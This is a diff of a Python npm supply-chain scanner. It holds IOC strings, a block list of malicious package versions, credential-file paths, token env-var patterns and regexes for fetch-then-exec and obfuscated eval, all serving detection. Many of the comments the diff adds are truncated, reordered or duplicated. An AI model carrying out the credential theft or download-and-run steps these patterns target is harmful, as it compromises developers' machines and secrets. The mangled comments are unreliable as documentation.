@@ -58,35 +58,27 @@ from pathlib import Path
 
 REPO_ROOT = Path(__file__).resolve().parents[1]
 
-# ─────────────────────────────────────────────────────────────────────
-# Hard caps (deliberately conservative; npm tarballs in this repo are
-# all well under these limits, so a packaging spike is noticeable).
-# ─────────────────────────────────────────────────────────────────────
-# Caps calibrated against the real Unsloth frontend transitive closure:
-#   - typescript.js is 9.1 MB (TS compiler bundled into one file)
-#   - mermaid 11.x dist/mermaid.js.map is ~12 MB (sourcemap)
-#   - lightningcss-linux-x64-{gnu,musl}.node is 10 MB
-#   - rolldown bindings (.node) are 18-26 MB per platform
-#   - @next/swc-*.node is ~137 MB (rust-compiled SWC engine)
-#   - next.js cumulative bundle is ~134 MB (turbopack compiled)
-#
-# Native binaries (.node, .wasm, .so, .dll, .dylib) are GENUINELY
-# huge and not amenable to text pattern scanning -- we extract them
-# only to verify the tarball integrity over the full archive, then
-# skip them in scan_extracted_tree. They get a much higher per-file
-# cap. Text files (JS/TS/JSON/etc) keep the tight cap because the
-# pattern scanner runs over them and a 9.1 MB typescript.js is the
-# legitimate ceiling.
-HARD_MAX_TARBALL_BYTES = 256 * 1024 * 1024  # 256 MiB compressed
-HARD_MAX_TEXT_FILE_BYTES = 16 * 1024 * 1024  # 16 MiB per text file
-HARD_MAX_BINARY_FILE_BYTES = 256 * 1024 * 1024  # 256 MiB per .node etc
-HARD_MAX_TOTAL_BYTES = 512 * 1024 * 1024  # 512 MiB cumulative
-HARD_MAX_MEMBERS = 50_000  # entries per tarball
-HARD_HTTP_TIMEOUT_S = 60  # per request
+# ───────────────────────────────────────────────────────────────────── Hard caps (deliberately conservative;
+# ───────────────────────────────────────────────────────────────────── Caps calibrated against the real Unsloth
+# frontend transitive closure: - typescript.js is 9.1 MB (TS compiler bundled into one file) - mermaid 11.x
+# dist/mermaid.js.map is ~12 MB (sourcemap) - lightningcss-linux-x64-{gnu,musl}.node is 10 MB - rolldown bindings
+# (.node) are 18-26 MB per platform - @next/swc-*.node is ~137 MB (rust-compiled SWC engine) - next.js cumulative bundle
+# is ~134 MB (turbopack compiled) Native binaries (.node, .wasm, .so, .dll, .dylib) are GENUINELY huge and not amenable
+# to text pattern scanning
+# we extract them only to verify the tarball integrity over the full archive, then skip them in scan_extracted_tree.
+# Text files (JS/TS/JSON/etc) keep the tight cap because the pattern scanner runs over them and a 9.1 MB typescript.js
+# is the legitimate ceiling.
+# 256 MiB compressed 16 MiB per text file 256 MiB per .node etc 512 MiB cumulative entries per tarball per request
+HARD_MAX_TARBALL_BYTES = 256 * 1024 * 1024
+HARD_MAX_TEXT_FILE_BYTES = 16 * 1024 * 1024
+HARD_MAX_BINARY_FILE_BYTES = 256 * 1024 * 1024
+HARD_MAX_TOTAL_BYTES = 512 * 1024 * 1024
+HARD_MAX_MEMBERS = 50_000
+HARD_HTTP_TIMEOUT_S = 60
 
 # Native-binary / compiled-asset suffixes that bypass the text cap.
-# This is the SUFFIX shortlist; the content-magic check below covers
-# extensionless executables (biome) and versioned shared libraries
+# This is the SUFFIX shortlist;
+# the content-magic check below covers extensionless executables (biome) and versioned shared libraries
 # (libvips-cpp.so.8.17.3) that the suffix list misses.
 _BINARY_SUFFIXES = (
     ".node",
@@ -130,30 +122,28 @@ _VERSIONED_LIB = re.compile(
 )
 
 # Magic numbers at offset 0 that identify common executable formats.
-# We sniff the first ~16 bytes of every member to catch extensionless
-# binaries (eg `package/biome`, `package/bin/foo`).
 _BINARY_MAGICS = (
-    b"\x7fELF",  # ELF (Linux executable / .so)
-    b"MZ",  # PE / .exe / .dll (DOS header prefix)
-    b"\xfe\xed\xfa\xce",  # Mach-O 32 BE
-    b"\xfe\xed\xfa\xcf",  # Mach-O 64 BE
-    b"\xce\xfa\xed\xfe",  # Mach-O 32 LE
-    b"\xcf\xfa\xed\xfe",  # Mach-O 64 LE
-    b"\xca\xfe\xba\xbe",  # Mach-O fat / Java class (also starts with this)
-    b"\x00asm",  # WASM
-    b"PK\x03\x04",  # ZIP / JAR / nupkg / xpi
-    b"PK\x05\x06",  # ZIP (empty)
-    b"\x1f\x8b",  # gzip
-    b"BZh",  # bzip2
-    b"\xfd7zXZ",  # xz
-    b"7z\xbc\xaf\x27\x1c",  # 7zip
-    b"\x89PNG",  # PNG
-    b"\xff\xd8\xff",  # JPEG
-    b"GIF8",  # GIF
-    b"RIFF",  # WAV / WEBP / AVI container
-    b"\x00\x00\x01\x00",  # ICO
-    b"OggS",  # Ogg
-    b"\x1aE\xdf\xa3",  # Matroska / WebM
+    b"\x7fELF",  # ELF (Linux executable / .so) PE / .exe / .dll (DOS header prefix) Mach-O 32 BE Mach-O 64 BE Mach-O 32
+    b"MZ",
+    b"\xfe\xed\xfa\xce",
+    b"\xfe\xed\xfa\xcf",
+    b"\xce\xfa\xed\xfe",
+    b"\xcf\xfa\xed\xfe",
+    b"\xca\xfe\xba\xbe",
+    b"\x00asm",
+    b"PK\x03\x04",
+    b"PK\x05\x06",
+    b"\x1f\x8b",
+    b"BZh",
+    b"\xfd7zXZ",
+    b"7z\xbc\xaf\x27\x1c",
+    b"\x89PNG",
+    b"\xff\xd8\xff",
+    b"GIF8",
+    b"RIFF",
+    b"\x00\x00\x01\x00",
+    b"OggS",
+    b"\x1aE\xdf\xa3",
 )
 
 
@@ -175,9 +165,6 @@ def _looks_binary(name: str, header: bytes) -> bool:
 
 ALLOWED_DOWNLOAD_HOST = "registry.npmjs.org"
 
-# ─────────────────────────────────────────────────────────────────────
-# Severities + finding shape (mirrors scripts/scan_packages.py).
-# ─────────────────────────────────────────────────────────────────────
 CRITICAL = "CRITICAL"
 HIGH = "HIGH"
 MEDIUM = "MEDIUM"
@@ -188,11 +175,11 @@ _SEVERITY_RANK = {CRITICAL: 0, HIGH: 1, MEDIUM: 2, INFO: 3}
 @dataclass
 class Finding:
     severity: str
-    package: str  # name@version
-    filename: str  # relative path inside the tarball
-    pattern: str  # what matched
-    evidence: str = ""  # short surrounding snippet
-    detail: str = ""  # human-readable description
+    package: str
+    filename: str
+    pattern: str
+    evidence: str = ""
+    detail: str = ""
 
     def __str__(self) -> str:
         head = f"  [{self.severity}] {self.package} :: {self.filename}"
@@ -220,16 +207,11 @@ class PackageEntry:
         return f"{self.name}@{self.version}"
 
 
-# ─────────────────────────────────────────────────────────────────────
-# IOC patterns. Two flavours:
-#   - HOSTS / TOKEN_PATHS: high-confidence substrings; near-zero FP rate
-#   - JS_PATTERNS / SCRIPT_PATTERNS: regex; tuned to recent campaigns
-# Keep this list short and factual. Speculative patterns spam the
-# false-positive ledger and dull the signal.
-# ─────────────────────────────────────────────────────────────────────
 
 
-# Substring (case-sensitive) -> (severity, detail).
+# ───────────────────────────────────────────────────────────────────── IOC patterns.
+# Two flavours: - HOSTS / TOKEN_PATHS: high-confidence substrings;
+# near-zero FP rate - JS_PATTERNS / SCRIPT_PATTERNS: regex;
 KNOWN_IOC_STRINGS: dict[str, tuple[str, str]] = {
     # Shai-Hulud TanStack wave (2026-05-11, GHSA-g7cv-rxg3-hmpx).
     "router_init.js": (HIGH, "filename associated with TanStack worm"),
@@ -261,7 +243,7 @@ KNOWN_IOC_STRINGS: dict[str, tuple[str, str]] = {
         HIGH,
         "tanstack_runner.js payload SHA-256",
     ),
-    # The new dependency vector: optional dep -> Bun-executed prepare script.
+    # The new dependency vector:
     "bun run tanstack_runner.js": (
         CRITICAL,
         "TanStack-wave Bun prepare-script dropper invocation",
@@ -273,8 +255,7 @@ KNOWN_IOC_STRINGS: dict[str, tuple[str, str]] = {
 }
 
 # Hard pin-blocks for publicly confirmed malicious versions.
-# name -> {malicious_versions...}. A match short-circuits the scan
-# at the lockfile-walk stage; no tarball is fetched.
+# name -> {malicious_versions...}.
 # keep in sync with scripts/lockfile_supply_chain_audit.py
 BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
     # GHSA-g7cv-rxg3-hmpx -- TanStack May-11 2026 (84 versions).
@@ -320,10 +301,10 @@ BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
     "@tanstack/vue-start-client": {"1.166.46", "1.166.49"},
     "@tanstack/vue-start-server": {"1.166.50", "1.166.53"},
     "@tanstack/zod-adapter": {"1.166.12", "1.166.15"},
-    # Mini Shai-Hulud May-12 wave: OpenSearch JS client.
+    # Mini Shai-Hulud May-12 wave:
     "@opensearch-project/opensearch": {"3.5.3", "3.6.2", "3.7.0", "3.8.0"},
-    # Mini Shai-Hulud May-12 wave: @squawk/* (22 packages, 5 versions each;
     # https://safedep.io/mass-npm-supply-chain-attack-tanstack-mistral/).
+    # Mini Shai-Hulud May-12 wave:
     "@squawk/airport-data": {"0.7.4", "0.7.5", "0.7.6", "0.7.7", "0.7.8"},
     "@squawk/airports": {"0.6.2", "0.6.3", "0.6.4", "0.6.5", "0.6.6"},
     "@squawk/airspace": {"0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5"},
@@ -346,8 +327,8 @@ BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
     "@squawk/types": {"0.8.1", "0.8.2", "0.8.3", "0.8.4", "0.8.5"},
     "@squawk/units": {"0.4.3", "0.4.4", "0.4.5", "0.4.6", "0.4.7"},
     "@squawk/weather": {"0.5.6", "0.5.7", "0.5.8", "0.5.9", "0.5.10"},
-    # Mini Shai-Hulud May-12 wave: @uipath/* (64 packages, single version each;
     # https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised).
+    # Mini Shai-Hulud May-12 wave:
     "@uipath/apollo-react": {"4.24.5"},
     "@uipath/apollo-wind": {"2.16.2"},
     "@uipath/cli": {"1.0.1"},
@@ -414,13 +395,12 @@ BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
     "@uipath/functions-tool": {"1.0.1"},
     "@uipath/access-policy-sdk": {"0.3.1"},
     "@uipath/platform-tool": {"1.0.1"},
-    # Mini Shai-Hulud May-12 wave: @mistralai/* (npm), separate from PyPI mistralai
     # (https://www.aikido.dev/blog/mini-shai-hulud-is-back-tanstack-compromised).
+    # Mini Shai-Hulud May-12 wave:
     "@mistralai/mistralai": {"2.2.2", "2.2.3", "2.2.4"},
     "@mistralai/mistralai-gcp": {"1.7.1", "1.7.2", "1.7.3"},
     "@mistralai/mistralai-azure": {"1.7.1", "1.7.2", "1.7.3"},
-    # Mini Shai-Hulud May-12 wave: @tallyui/* (30 entries, 10 packages)
-    # (Aikido enumeration).
+    # Mini Shai-Hulud May-12 wave:
     "@tallyui/components": {"1.0.1", "1.0.2", "1.0.3"},
     "@tallyui/connector-medusa": {"1.0.1", "1.0.2", "1.0.3"},
     "@tallyui/connector-shopify": {"1.0.1", "1.0.2", "1.0.3"},
@@ -431,8 +411,7 @@ BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
     "@tallyui/pos": {"0.1.1", "0.1.2", "0.1.3"},
     "@tallyui/storage-sqlite": {"0.2.1", "0.2.2", "0.2.3"},
     "@tallyui/theme": {"0.2.1", "0.2.2", "0.2.3"},
-    # Mini Shai-Hulud May-12 wave: @beproduct/nestjs-auth (18 versions)
-    # (Aikido enumeration).
+    # Mini Shai-Hulud May-12 wave:
     "@beproduct/nestjs-auth": {
         "0.1.2",
         "0.1.3",
@@ -453,19 +432,16 @@ BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
         "0.1.18",
         "0.1.19",
     },
-    # Mini Shai-Hulud May-12 wave: @draftlab/* + @draftauth/*
-    # (Aikido enumeration).
+    # Mini Shai-Hulud May-12 wave:
     "@draftauth/client": {"0.2.1", "0.2.2"},
     "@draftauth/core": {"0.13.1", "0.13.2"},
     "@draftlab/auth": {"0.24.1", "0.24.2"},
     "@draftlab/auth-router": {"0.5.1", "0.5.2"},
     "@draftlab/db": {"0.16.1"},
-    # Mini Shai-Hulud May-12 wave: @taskflow-corp/cli + @tolka/cli
-    # (Aikido enumeration).
+    # Mini Shai-Hulud May-12 wave:
     "@taskflow-corp/cli": {"0.1.24", "0.1.25", "0.1.26", "0.1.27", "0.1.28", "0.1.29"},
     "@tolka/cli": {"1.0.2", "1.0.3", "1.0.4", "1.0.5", "1.0.6"},
-    # Mini Shai-Hulud May-12 wave: @ml-toolkit-ts/* + @mesadev/* + @dirigible-ai/sdk + @supersurkhet/*
-    # (Aikido enumeration).
+    # Mini Shai-Hulud May-12 wave:
     "@dirigible-ai/sdk": {"0.6.2", "0.6.3"},
     "@mesadev/rest": {"0.28.3"},
     "@mesadev/saguaro": {"0.4.22"},
@@ -474,8 +450,7 @@ BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
     "@ml-toolkit-ts/xgboost": {"1.0.3", "1.0.4"},
     "@supersurkhet/cli": {"0.0.2", "0.0.3", "0.0.4", "0.0.5", "0.0.6", "0.0.7"},
     "@supersurkhet/sdk": {"0.0.2", "0.0.3", "0.0.4", "0.0.5", "0.0.6", "0.0.7"},
-    # Mini Shai-Hulud May-12 wave: Unscoped packages (10 entries)
-    # (Aikido enumeration).
+    # Mini Shai-Hulud May-12 wave:
     "safe-action": {"0.8.3", "0.8.4"},
     "ts-dna": {"3.0.1", "3.0.2", "3.0.3", "3.0.4"},
     "cross-stitch": {"1.1.3", "1.1.4", "1.1.5", "1.1.6"},
@@ -486,28 +461,18 @@ BLOCKED_NPM_VERSIONS: dict[str, set[str]] = {
     "git-git-git": {"1.0.8", "1.0.9", "1.0.10", "1.0.11", "1.0.12"},
     "nextmove-mcp": {"0.1.3", "0.1.4", "0.1.5", "0.1.6", "0.1.7"},
     "ml-toolkit-ts": {"1.0.4", "1.0.5"},
-    # Cross-ecosystem Mini Shai-Hulud (Apr-30 wave): npm counterpart of
-    # PyPI lightning 2.6.2/2.6.3. Same threat actor (TeamPCP) per Semgrep,
-    # Aikido, OX Security, Resecurity. Safe version: 7.0.3 and earlier.
+    # Cross-ecosystem Mini Shai-Hulud (Apr-30 wave): npm counterpart of PyPI lightning 2.6.2/2.6.3.
+    # Safe version: 7.0.3 and earlier.
     "intercom-client": {"7.0.4"},
 }
 
-# Cloud / k8s / CI credential surfaces. A bare substring match here
-# false-positives on DEFENSIVE code -- e.g. langchain ships an SSRF
-# protection module with a literal blocklist of IMDS IPs. We split
-# these into two tiers:
-#
-#   ALWAYS_BAD: substrings with no legitimate use anywhere in a
-#     dependency. A bare match is enough.
-#
-#   NEEDS_CONTEXT: hosts/paths that DO appear legitimately in
-#     defensive code. We only fire when they co-occur with a fetch
-#     verb or appear inside an http URL -- that is the structural
-#     difference between "blocked address constant" and "exfil
-#     target".
-#
-# The dispatch lives in `_scan_cred_surface` below.
+# Cloud / k8s / CI credential surfaces.
+# A bare substring match here false-positives on DEFENSIVE code
+# langchain ships an SSRF protection module with a literal blocklist of IMDS IPs.
+# We split these into two tiers: ALWAYS_BAD: substrings with no legitimate use anywhere in a dependency.
+# NEEDS_CONTEXT: hosts/paths that DO appear legitimately in defensive code.
 
+# Cloud / k8s / CI credential surfaces.
 CRED_HOST_ALWAYS_BAD: tuple[tuple[str, str], ...] = (
     ("registry.npmjs.org/-/npm/v1/tokens", "npm publish-token enumeration endpoint"),
     ("ACTIONS_ID_TOKEN_REQUEST_URL", "GitHub Actions OIDC token-exchange endpoint env"),
@@ -526,10 +491,8 @@ CRED_HOST_NEEDS_CONTEXT: tuple[tuple[str, str], ...] = (
     ),
 )
 
-# Credentials a frontend package should never read. Bare substring
-# match is too noisy (legit dev tooling mounts ~/.npmrc), so we flag
-# these only inside lifecycle scripts -- the only auto-run path on
-# `npm ci`. See `scan_package_json` below.
+# Credentials a frontend package should never read.
+# See `scan_package_json` below.
 CRED_PATH_SUBSTRINGS: tuple[tuple[str, str], ...] = (
     ("/.npmrc", "npm credentials file"),
     ("/.aws/credentials", "AWS shared credentials file"),
@@ -539,8 +502,7 @@ CRED_PATH_SUBSTRINGS: tuple[tuple[str, str], ...] = (
     ("/.kube/config", "Kubernetes kubeconfig"),
 )
 
-# Fetch verbs whose presence near a metadata host upgrades a bare
-# substring hit into an actionable finding.
+# Fetch verbs whose presence near a metadata host upgrades a bare substring hit into an actionable finding.
 _FETCH_VERBS_PAT = (
     r"(?:fetch|axios|XMLHttpRequest|got\b|undici|"
     r"http\.get|https\.get|http\.request|https\.request|"
@@ -548,7 +510,6 @@ _FETCH_VERBS_PAT = (
     r"\.request\s*\(|\.get\s*\(\s*['\"]\s*https?://)"
 )
 
-# JS regex patterns (compile lazily).
 _JS_FETCH_EVAL = re.compile(
     r"""(?xs)
     (?:
@@ -561,8 +522,8 @@ _JS_FETCH_EVAL = re.compile(
     """,
 )
 
-# Token env access in install-time code; also catches os.environ[...]
-# for the rare Python-in-npm postinstall.
+# Token env access in install-time code;
+# also catches os.environ[...] for the rare Python-in-npm postinstall.
 _JS_ENV_TOKEN = re.compile(
     r"""(process\.env\.|os\.environ\[?['"])(?:
         GITHUB_TOKEN | GH_TOKEN | NPM_TOKEN | NODE_AUTH_TOKEN
@@ -573,9 +534,7 @@ _JS_ENV_TOKEN = re.compile(
     re.VERBOSE,
 )
 
-# Lifecycle-script fetch+exec chain: curl/wget an external resource
-# and run it. Bare curl/wget is allowed (legit fixture fetches); only
-# the fetch+exec chain is blocked.
+# Lifecycle-script fetch+exec chain:
 _LIFECYCLE_FETCH_EXEC = re.compile(
     r"""(?xs)
     (?:curl|wget|fetch|http\.get|axios\.get)\s+ # fetch verb
@@ -589,8 +548,8 @@ _LIFECYCLE_FETCH_EXEC = re.compile(
     """,
 )
 
-# Obfuscation: large single-line base64-ish blob behind Function()/
-# eval(). Tuned against the router_init.js shape (2.3 MB blob).
+# Obfuscation: large single-line base64-ish blob behind Function()/ eval().
+# Tuned against the router_init.js shape (2.3 MB blob).
 _OBFUSC_BLOB = re.compile(
     r"""(?xs)
     (?:Function|eval)\s*\(\s*['"`]?
@@ -599,9 +558,6 @@ _OBFUSC_BLOB = re.compile(
 )
 
 
-# ─────────────────────────────────────────────────────────────────────
-# Lockfile parsing.
-# ─────────────────────────────────────────────────────────────────────
 
 
 def parse_lockfile(path: Path) -> tuple[list[PackageEntry], list[Finding]]:
@@ -646,15 +602,13 @@ def parse_lockfile(path: Path) -> tuple[list[PackageEntry], list[Finding]]:
     for key, entry in (lock.get("packages") or {}).items():
         if key == "" or entry.get("link"):
             continue
-        # Nested fold-ins (deps inside another package's node_modules/)
-        # are covered by the parent tarball's integrity. Skip.
+        # Nested fold-ins (deps inside another package's node_modules/) are covered by the parent tarball's integrity.
         if key.count("/node_modules/") >= 1:
             continue
         resolved = entry.get("resolved")
         if not resolved:
             continue
-        # Strict registry origin check so this scanner can't be tricked
-        # into fetching from an attacker-chosen URL.
+        # Strict registry origin check so this scanner can't be tricked into fetching from an attacker-chosen URL.
         parsed = urllib.parse.urlparse(resolved)
         if parsed.scheme != "https" or parsed.hostname != ALLOWED_DOWNLOAD_HOST:
             findings.append(
@@ -683,7 +637,7 @@ def parse_lockfile(path: Path) -> tuple[list[PackageEntry], list[Finding]]:
                 )
             )
             continue
-        # node_modules/@scope/name -> @scope/name; node_modules/name -> name
+        # node_modules/@scope/name -> @scope/name;
         nm = "node_modules/"
         name = key[len(nm) :] if key.startswith(nm) else key
         version = entry.get("version") or "<unversioned>"
@@ -699,9 +653,6 @@ def parse_lockfile(path: Path) -> tuple[list[PackageEntry], list[Finding]]:
     return entries, findings
 
 
-# ─────────────────────────────────────────────────────────────────────
-# Tarball download (registry-only, size-capped, integrity-verified).
-# ─────────────────────────────────────────────────────────────────────
 
 
 def _decode_integrity(integrity: str) -> tuple[str, bytes] | None:
@@ -752,7 +703,6 @@ def download_tarball(
     )
     try:
         with urllib.request.urlopen(req, timeout = timeout) as r:
-            # Advertised length, if any.
             cl = r.headers.get("Content-Length")
             if cl is not None:
                 try:
@@ -786,9 +736,6 @@ def download_tarball(
     return dest, None
 
 
-# ─────────────────────────────────────────────────────────────────────
-# Safe tar extraction. Every Tarfile member is policed before write.
-# ─────────────────────────────────────────────────────────────────────
 
 
 def _is_within(root: Path, candidate: Path) -> bool:
@@ -820,7 +767,7 @@ def safe_extract(
     total = 0
     count = 0
     try:
-        # Streaming mode (no backward seeks); `r|gz` rejects bad gzip.
+        # Streaming mode (no backward seeks);
         with tarfile.open(tarball_path, mode = "r|gz") as tf:
             for member in tf:
                 count += 1
@@ -835,8 +782,7 @@ def safe_extract(
                     return f"refused link member {name!r} (sym/lnk)"
                 if member.isdev() or member.isfifo():
                     return f"refused special member {name!r}"
-                # Check declared size up front to short-circuit bombs
-                # without reading the body.
+                # Check declared size up front to short-circuit bombs without reading the body.
                 declared = max(member.size, 0)
                 if declared > HARD_MAX_BINARY_FILE_BYTES:
                     return (
@@ -848,8 +794,7 @@ def safe_extract(
                         f"cumulative bytes {total + declared} > cap "
                         f"{max_total_bytes} at {name!r}"
                     )
-                # Resolve destination and refuse anything escaping root
-                # (don't trust the npm "package/" convention).
+                # Resolve destination and refuse anything escaping root (don't trust the npm "package/" convention).
                 dest = extract_root / name
                 if not _is_within(extract_root, dest):
                     return f"refused escape: {name!r} resolved outside root"
@@ -857,14 +802,12 @@ def safe_extract(
                     dest.mkdir(parents = True, exist_ok = True)
                     continue
                 if not member.isfile():
-                    # Anything we didn't classify above is unknown.
                     return f"refused unknown member type for {name!r}"
                 dest.parent.mkdir(parents = True, exist_ok = True)
                 src = tf.extractfile(member)
                 if src is None:
                     continue
                 # Sniff first 16 bytes to classify text vs binary;
-                # each gets its own cap (both are bounded).
                 header = src.read(16)
                 is_binary = _looks_binary(name, header)
                 file_cap = HARD_MAX_BINARY_FILE_BYTES if is_binary else HARD_MAX_TEXT_FILE_BYTES
@@ -873,7 +816,6 @@ def safe_extract(
                         f"member {name!r} declared size {declared} > "
                         f"cap {file_cap} ({'binary' if is_binary else 'text'})"
                     )
-                # Read remainder, bounded.
                 remainder_cap = file_cap - len(header)
                 rest = src.read(remainder_cap + 1)
                 data = header + rest
@@ -883,7 +825,7 @@ def safe_extract(
                         f"({'binary' if is_binary else 'text'})"
                     )
                 total += len(data)
-                # Restrictive mode (rw-r--r--): nothing executable.
+                # Restrictive mode (rw-r--r--):
                 with open(dest, "wb") as out:
                     out.write(data)
                 os.chmod(dest, 0o644)
@@ -894,24 +836,15 @@ def safe_extract(
     return None
 
 
-# ─────────────────────────────────────────────────────────────────────
-# Content scanning.
-# ─────────────────────────────────────────────────────────────────────
 
 
-# How far back to look for an enclosing bracket opener. Symmetric with the
-# forward cap so a host that sits deep inside a large options object (its opening
-# `{` many properties above) still binds the whole object, not just its own line;
 # a too-far start only over-binds (more context, still fail-closed), never less.
+# How far back to look for an enclosing bracket opener.
 _MAX_CONT_LINES = 200
-# Hard cap on how far forward a bracket group is followed to its close, measured
-# from the matched line so the tail after the match is always reachable even when
-# the opener was found near the backward limit (digest input only, never
-# displayed); a realistic config object closes well within it.
+# Hard cap on how far forward a bracket group is followed to its close, measured from the matched line so the tail
 _MAX_GROUP_LINES = 200
 
-# JS string literal (single / double / template), blanked before counting
-# brackets so a bracket inside a string is not mistaken for code.
+# JS string literal (single / double / template), blanked before counting brackets so a bracket inside a string is not
 _RE_JS_STR = re.compile(r"'(?:[^'\\]|\\.)*'|\"(?:[^\"\\]|\\.)*\"|`(?:[^`\\]|\\.)*`")
 
 
@@ -956,10 +889,8 @@ def _find_unescaped(line: str, quote: str, start: int) -> int:
     return -1
 
 
-# A `/` is a regex literal (not division) when the previous significant character
-# is none (start) or one of these expression-position chars. Used only by the
-# multi-line blanked view, and the span is unioned with the single-line view, so
 # an over- or under-detection only ever grows the bound span (never shrinks it).
+# A `/` is a regex literal (not division) when the previous significant character is none (start) or one of these
 _JS_REGEX_PRECEDERS = frozenset("([{,;:?=&|!+-*/%^~<>")
 
 
@@ -971,8 +902,8 @@ def _blank_js_strings(lines: list[str]) -> list[str]:
     literal spanning several lines or a ``/)/`` regex -- which a per-line regex
     cannot blank. Escapes are honoured."""
     out: list[str] = []
-    in_back = False  # inside a multi-line `template` literal
-    prev_sig = ""  # last significant non-space char (for regex-vs-division)
+    in_back = False  # inside a multi-line `template` literal last significant non-space char (for regex-vs-division)
+    prev_sig = ""
     for line in lines:
         buf: list[str] = []
         i, n = 0, len(line)
@@ -1006,9 +937,8 @@ def _blank_js_strings(lines: list[str]) -> list[str]:
                 prev_sig = "v"  # a string is a value: a following `/` is division
                 continue
             if ch == "/" and (prev_sig == "" or prev_sig in _JS_REGEX_PRECEDERS):
-                # Regex literal: blank to the closing unescaped `/` outside a `[...]`
                 # char class. A regex never spans lines, so no close on the line
-                # means this `/` is really division.
+                # Regex literal: blank to the closing unescaped `/` outside a `[...]` char class.
                 j, in_class, closed = i + 1, False, False
                 while j < n:
                     c = line[j]
@@ -1053,25 +983,18 @@ def _index_text(text: str) -> tuple[list[str], list[str], list[str], list[int]]:
     return lines, sl_blanked, ml_blanked, nl
 
 
-# Cap on formatted matches in one evidence string; beyond it the remaining match
 # texts are folded into a single digest so a huge/minified file cannot build a
-# multi-megabyte evidence blob while an added/removed match past the cap still
-# changes the key.
+# Cap on formatted matches in one evidence string;
 _MAX_EVIDENCE_MATCHES = 64
 
 
 def _scan_group(blanked: list[str], idx: int) -> tuple[int, int]:
     """(start, end) line indices of the bracket group enclosing line ``idx`` in one
     blanked view: scan back to the still-open opener, then forward to its close."""
-    # Backward: find the line that opens a bracket still unclosed at the match,
-    # so a match inside a multi-line object starts from the object opener. Each line
-    # is reduced to (L, R) and applied in order: first the L closers consume open
-    # brackets from the running context (a stray closer whose opener is outside the
-    # window only clamps depth at 0, it never goes negative), then the R openers
-    # add to it. Tracking order this way (rather than a single net per line) keeps a
-    # trailing opener visible even when leading closers on the same line net it to
-    # <= 0, e.g. `}); const opts = {`, which a net count would drop -- letting a
-    # changed path/headers after such a line ride the unchanged-hostname key.
+    # Backward: find the line that opens a bracket still unclosed at the match, so a match inside a multi-line object
+    # starts from the object opener.
+    # Tracking order this way (rather than a single net per line) keeps a trailing opener visible even when leading
+    # closers on the same line net it to <= 0, e.g.
     start = idx
     depth = 0
     for j in range(max(0, idx - _MAX_CONT_LINES), idx):
@@ -1086,12 +1009,8 @@ def _scan_group(blanked: list[str], idx: int) -> tuple[int, int]:
                 start = j  # outermost still-open opener begins here
             depth += right
 
-    # Forward: extend until the group opened at `start` closes past the match. The
-    # same order-aware reduction is used (clamping leading closers at 0) so the
-    # foreign `})` on the opener line does not drive the count negative and stop the
-    # scan before the real close. The cap is measured from the match (`idx`), not
-    # from `start`, so an opener found near the backward limit does not eat the
-    # whole forward budget and drop the path/headers/body that follow the match.
+    # Forward:
+    # Forward: extend until the group opened at `start` closes past the match.
     depth = 0
     end = start
     for j in range(start, min(len(blanked), idx + _MAX_GROUP_LINES)):
@@ -1168,13 +1087,7 @@ def _format_match(
     m: re.Match,
     max_chars: int,
 ) -> str:
-    # The shown snippet is a small window around the match; append a digest of the
-    # full LOGICAL line (the matched line plus its bracket-continuation lines)
-    # whenever the snippet does not already show all of it, so a changed payload
-    # tail, a truncated body, or a multi-line option/header reopens. Offsets are
-    # mapped to line numbers via bisect over precomputed newline positions, so this
-    # is O(log n) instead of rescanning the file prefix for every match.
-    idx = bisect.bisect_left(nl, m.start())  # 0-based line index of the match
+    idx = bisect.bisect_left(nl, m.start())
     line_start = nl[idx - 1] + 1 if idx > 0 else 0
     ke = bisect.bisect_left(nl, m.end())
     line_end = nl[ke] if ke < len(nl) else len(text)
@@ -1185,9 +1098,7 @@ def _format_match(
     if len(snippet) > max_chars:
         snippet = snippet[:max_chars] + "..."
     if snippet != full_logical:
-        # Normalize before digesting, matching _evidence_hash, so a formatter-only
-        # reindent of the bound continuation lines does not reopen -- but preserve
-        # whitespace inside string literals so a changed request/payload body does.
+        # Normalize before digesting, matching _evidence_hash, so a formatter-only reindent of the bound continuation
         canon = _canon_preserve_strings(full_logical)
         digest = hashlib.sha256(canon.encode("utf-8", "replace")).hexdigest()
         snippet = f"{snippet} sha256:{digest}"
@@ -1227,14 +1138,11 @@ def _evidence(
     pat: re.Pattern,
     max_chars: int = 200,
 ) -> str:
-    # Record every match (not a truncated sample) so an extra match appended to an
-    # already-flagged file changes the evidence instead of riding the first few.
-    # Past _MAX_EVIDENCE_MATCHES the remaining matches are folded into one digest
-    # (binding their logical-line context) so the evidence string stays bounded
-    # while a changed payload past the cap still reopens. The matches are streamed
-    # from finditer rather than materialized into a list: a generated file can
-    # repeat a cheap signal (e.g. NPM_TOKEN) millions of times, and holding a
-    # re.Match per occurrence before applying the cap would stall or OOM the scan.
+    # Record every match (not a truncated sample) so an extra match appended to an already-flagged file changes the
+    # evidence instead of riding the first few.
+    # The matches are streamed from finditer rather than materialized into a list: a generated file can repeat a cheap
+    # signal (e.g.
+    # NPM_TOKEN) millions of times, and holding a re.Match per occurrence before applying the cap would stall or OOM the
     it = pat.finditer(text)
     shown_matches = list(itertools.islice(it, _MAX_EVIDENCE_MATCHES))
     if not shown_matches:
@@ -1244,7 +1152,6 @@ def _evidence(
         _format_match(text, lines, sl_blanked, ml_blanked, nl, m, max_chars) for m in shown_matches
     ]
     # Fold the rest (past the cap) into one digest as they arrive, never building a
-    # second list. Byte-identical to digesting matches[_MAX_EVIDENCE_MATCHES:].
     overflow_count, digest = _stream_overflow_digest(it, lines, sl_blanked, ml_blanked, nl)
     if overflow_count:
         shown.append(f"(+{overflow_count} more) sha256:{digest}")
@@ -1262,14 +1169,8 @@ def _ioc_evidence(text: str, needle: str) -> str:
 LIFECYCLE_HOOKS = ("preinstall", "install", "postinstall", "prepare")
 
 
-# ─────────────────────────────────────────────────────────────────────
-# Code-only scanning for JS/TS sources. Blank `//` and `/* */` comments
-# before matching (the top FP source: scary strings in JSDoc/changelog
-# comments), tracking string/template/regex context so a `//` inside
